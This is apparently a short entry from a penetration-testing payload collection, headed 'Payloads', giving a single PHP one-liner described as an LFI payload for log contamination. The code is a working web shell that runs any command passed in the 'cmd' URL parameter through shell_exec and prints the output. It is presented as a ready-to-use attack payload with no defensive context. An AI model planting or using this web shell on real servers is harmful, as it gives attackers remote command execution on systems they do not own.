# Payloads

### php: LFI payload in PHP (can be used as log contamination)
```php
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```
